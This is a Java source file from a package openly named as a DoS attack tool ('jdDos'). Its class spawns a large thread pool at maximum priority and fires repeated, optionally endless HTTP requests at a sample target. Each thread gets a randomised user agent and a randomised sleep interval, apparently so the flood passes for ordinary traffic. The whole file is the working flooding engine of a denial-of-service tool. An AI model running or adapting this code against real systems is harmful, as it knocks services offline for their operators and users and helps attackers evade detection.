package gh.sep.attacks.jdDos.thread;

import gh.sep.attacks.jdDos.helper.RandomUserAgent;
import gh.sep.attacks.jdDos.request.InfiniteRunnableRequest;
import gh.sep.attacks.jdDos.request.Request;
import gh.sep.attacks.jdDos.request.RunnableRequest;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.scheduling.concurrent.ThreadPoolTaskExecutor;

import java.util.List;
import java.util.Random;
import java.util.concurrent.CopyOnWriteArrayList;

public class RequestThreadGroupRunner {
    Logger logger = LoggerFactory.getLogger(RequestThreadGroupRunner.class);

    private Request sample;
    private int threadsCount;
    private boolean infinite = false;
    private boolean fixedSleep = false;
    private int sleep = 5000;
    private ThreadPoolTaskExecutor taskExecutor;
    private List<Runnable> runnables = new CopyOnWriteArrayList<Runnable>();
    private final RandomUserAgent randomUserAgent;

    public RequestThreadGroupRunner(Request sample, int threadsCount, RandomUserAgent randomUserAgent, boolean infinite) {
        this.sample = sample;
        this.threadsCount = threadsCount;
        this.randomUserAgent = randomUserAgent;
        this.infinite = infinite;
    }

    private void makeExecutorPool(int threadsCount) {
        taskExecutor = new ThreadPoolTaskExecutor();
        taskExecutor.setCorePoolSize(threadsCount);
        taskExecutor.setMaxPoolSize(threadsCount + 100);
        taskExecutor.setQueueCapacity(100);
        taskExecutor.setAllowCoreThreadTimeOut(true);
        taskExecutor.setThreadPriority(Thread.MAX_PRIORITY);
        taskExecutor.afterPropertiesSet();
        taskExecutor.setDaemon(true);
        taskExecutor.initialize();
    }

    public void start(){
        makeExecutorPool(threadsCount);
        for(int i = 1; i <= threadsCount; i++){
            setUserAgent(sample);
            Runnable runnable = getRunnableRequest(sample);
            runnables.add(runnable);
            taskExecutor.execute(runnable);
            logger.debug("Started thread " + i);
        }
        logger.debug("Starting finished");
    }

    private void setUserAgent(Request request) {
        request.setUserAgent(randomUserAgent.getRandomUserAgent());

    }

    public void end(){
        for(Runnable runnable: runnables){
            if(runnable instanceof InfiniteRunnableRequest)
                ((InfiniteRunnableRequest) runnable).stop();
        }
        runnables = new CopyOnWriteArrayList<Runnable>();
        if(taskExecutor != null){
            taskExecutor.shutdown();
            taskExecutor.destroy();
            taskExecutor = null;
        }
    }

    private Runnable getRunnableRequest(Request request){
        if(!infinite)
            return new RunnableRequest(request);
        else
            return new InfiniteRunnableRequest(request, getProperSleep());
    }

    private int getProperSleep() {
        if(fixedSleep)
            return sleep;
        else{
            return new Random().nextInt((10000 - 2000) + 1) + 2000;
        }
    }

    public Request getSample() {
        return sample;
    }

    public int getThreadsCount() {
        return threadsCount;
    }

    public boolean isInfinite() {
        return infinite;
    }

    public void setSleep(int sleep) {
        fixedSleep = true;
        infinite = true;
        this.sleep = sleep;
    }
}
